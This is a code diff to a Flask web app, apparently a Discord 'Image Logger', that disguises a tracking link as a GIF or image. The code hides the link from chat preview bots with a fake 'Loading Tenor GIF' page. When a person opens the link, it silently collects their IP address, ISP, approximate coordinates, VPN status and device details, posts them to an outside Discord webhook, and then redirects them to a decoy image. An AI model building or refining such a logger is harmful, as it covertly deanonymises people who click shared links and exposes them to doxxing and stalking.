@@ -32,71 +32,92 @@ def get_ip_info(ip):
 @app.route('/')
 def logger():
     try:
-        # Extract IP (Vercel uses x-forwarded-for)
+        # 1. Get User-Agent and IP
+        user_agent_string = request.headers.get('User-Agent', 'Unknown')
         ip = request.headers.get('x-forwarded-for', request.remote_addr)
         if ip and ',' in ip:
             ip = ip.split(',')[0].strip()
 
-        user_agent_string = request.headers.get('User-Agent', 'Unknown')
-        ua = parse(user_agent_string)
+        # 2. Check for Bots (Discord, etc.)
+        is_bot = any(bot in user_agent_string for bot in ["Discordbot", "TelegramBot", "Twitterbot", "Slackbot", "LinkedInBot"])
         
-        # Advanced Device Info
-        os_detail = f"{ua.os.family} {ua.os.version_string}"
-        browser_detail = f"{ua.browser.family} {ua.browser.version_string}"
-        device_type = "Mobile" if ua.is_mobile else "Desktop" if ua.is_pc else "Tablet" if ua.is_tablet else "Bot" if ua.is_bot else "Unknown"
-        
-        full_device_info = f"{device_type} | {os_detail} | {browser_detail} | {ua.device.family}"
-
-        # Get Geo-location
+        # 3. Get IP Info
         geo = get_ip_info(ip)
         
-        # Prepare Discord Webhook Content
-        embed = {
-            "title": "Advanced Visitor Logged",
-            "color": 3447003, # Blue
-            "timestamp": datetime.now().isoformat(),
-            "fields": [
-                {"name": "IP Address", "value": f"`{ip}`", "inline": True},
-                {"name": "Device Type", "value": f"`{device_type}`", "inline": True},
-                {"name": "Full Device Info", "value": f"```\n{full_device_info}\n```", "inline": False},
-            ]
-        }
-
-        if geo and geo.get('status') == 'success':
-            # Add flags for Proxy/VPN and Mobile network
-            security_status = []
-            if geo.get('proxy'): security_status.append("Proxy/VPN Detected")
-            if geo.get('mobile'): security_status.append("Mobile Data")
+        # 4. Handle BOT Case (Discord Link Preview)
+        if is_bot:
+            # Send "Link Sent" Log
+            payload = {
+                "username": "Image Logger",
+                "embeds": [{
+                    "title": "Image Logger - Link Sent",
+                    "description": "An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.",
+                    "color": 3447003,
+                    "fields": [
+                        {"name": "Endpoint", "value": "`/api/image`", "inline": False},
+                        {"name": "IP", "value": f"`{ip}`", "inline": True},
+                        {"name": "Platform", "value": "`Discord`" if "Discord" in user_agent_string else "`Other`", "inline": True}
+                    ]
+                }]
+            }
+            requests.post(WEBHOOK_URL, json=payload, timeout=5)
             
-            security_val = "\n".join(security_status) if security_status else "Direct Connection"
+            # Return "Loading" page to Discord to prevent preview
+            return """
+            <html>
+            <head><title>Loading...</title></head>
+            <body style="background-color: #2f3136; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif;">
+                <div style="text-align: center;">
+                    <div style="border: 8px solid #444; border-top: 8px solid #5865f2; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
+                    <p>Loading Tenor GIF...</p>
+                </div>
+                <style> @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } </style>
+            </body>
+            </html>
+            """
 
-            embed["fields"].extend([
-                {"name": "Location", "value": f"{geo.get('city')}, {geo.get('regionName')}, {geo.get('country')} ({geo.get('countryCode')})", "inline": False},
-                {"name": "Zip Code", "value": f"`{geo.get('zip')}`", "inline": True},
-                {"name": "Currency", "value": f"`{geo.get('currency')}`", "inline": True},
-                {"name": "Connection Security", "value": f"`{security_val}`", "inline": True},
-                {"name": "ISP / Organization", "value": f"```\n{geo.get('isp')}\n{geo.get('org')}\n```", "inline": False},
-                {"name": "Google Maps", "value": f"[Click to view {geo.get('city')} on Map](https://www.google.com/maps?q={geo.get('lat')},{geo.get('lon')})", "inline": False},
-            ])
-        else:
-            embed["description"] = "Could not retrieve geolocation info. Possibly a Localhost or Reserved IP."
-            embed["color"] = 15158332 # Red
+        # 5. Handle HUMAN Case
+        ua = parse(user_agent_string)
+        os_detail = f"{ua.os.family} {ua.os.version_string}"
+        browser_detail = f"{ua.browser.family} {ua.browser.version_string}"
+        full_device = f"{ua.os.family} | {ua.browser.family} | {ua.device.family}"
 
-        payload = {
-            "username": "Advanced IP Locator",
-            "embeds": [embed]
+        # Build Detailed Embed
+        embed = {
+            "title": "Image Logger - IP Logged",
+            "description": "A User Opened the Original Image!",
+            "color": 3447003,
+            "thumbnail": {"url": "https://i.imgur.com/w9fXfM9.png"}, # Tiny icon
+            "fields": [
+                {"name": "Endpoint", "value": "`/api/image`", "inline": False},
+                {"name": "IP Info:", "value": f"```\nIP: {ip}\nProvider: {geo.get('isp', 'Unknown')}\nASN: {geo.get('as', 'Unknown')}\nCountry: {geo.get('country', 'Unknown')}\nRegion: {geo.get('regionName', 'Unknown')}\nCity: {geo.get('city', 'Unknown')}\nCoords: {geo.get('lat', '??')}, {geo.get('lon', '??')} (Approximate)\nTimezone: {geo.get('timezone', 'Unknown')}\nMobile: {'True' if geo.get('mobile') else 'False'}\nVPN: {'True' if geo.get('proxy') else 'False'}\nBot: False\n```", "inline": False},
+                {"name": "PC Info:", "value": f"```\nOS: {os_detail}\nBrowser: {browser_detail}\nDetails: {full_device}\n```", "inline": False}
+            ],
+            "timestamp": datetime.now().isoformat()
         }
 
-        # Send to Discord
-        try:
-            requests.post(WEBHOOK_URL, json=payload, timeout=10)
-        except:
-            pass
+        requests.post(WEBHOOK_URL, json={"username": "Image Logger", "embeds": [embed]}, timeout=10)
 
-        # Redirect to image
+        # 6. Show Decoy/Loading Page then Redirect
         import random
         redirect_url = CUSTOM_IMAGE_URL if CUSTOM_IMAGE_URL else random.choice(IMAGES)
-        return redirect(redirect_url)
+        
+        return f"""
+        <html>
+        <head>
+            <title>Loading...</title>
+            <meta http-equiv="refresh" content="2;url={redirect_url}">
+        </head>
+        <body style="background-color: #2f3136; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif;">
+            <div style="text-align: center;">
+                <img src="https://i.imgur.com/83pBy9S.gif" width="50" style="margin-bottom: 20px;">
+                <h2>Loading GIF...</h2>
+                <p>Please wait while the media loads.</p>
+            </div>
+            <script> setTimeout(() => {{ window.location.href = "{redirect_url}"; }}, 1500); </script>
+        </body>
+        </html>
+        """
         
     except Exception as e:
         import traceback
